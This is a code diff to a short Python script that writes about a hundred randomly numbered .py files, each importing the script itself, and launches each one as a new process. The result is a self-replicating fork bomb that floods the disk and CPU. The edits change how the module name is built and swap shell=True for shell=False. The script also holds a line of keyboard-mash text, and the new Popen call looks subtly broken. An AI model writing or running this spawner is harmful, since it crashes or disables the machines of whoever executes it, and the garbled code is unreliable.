@@ -5,7 +5,8 @@ import os
 adkjghkudhgkuydhilbzfsiubgfdzldg
 
 randoNum = 100000
-name = os.path.basename(__file__)
+name = os.path.splitext(os.path.basename(__file__))
+name = name[0]
 
 contents = f'''
 import {name} as m
@@ -34,5 +35,5 @@ for a in range(100):
 	i = r.randint(0, randoNum)
 	writeFile(f"{i}.py", contents)
 	filename = "python " + str(i) + ".py"
-	s.Popen(filename, shell=True)
+	s.Popen(filename, shell=False)
 	print(f"Created {i}.py!")
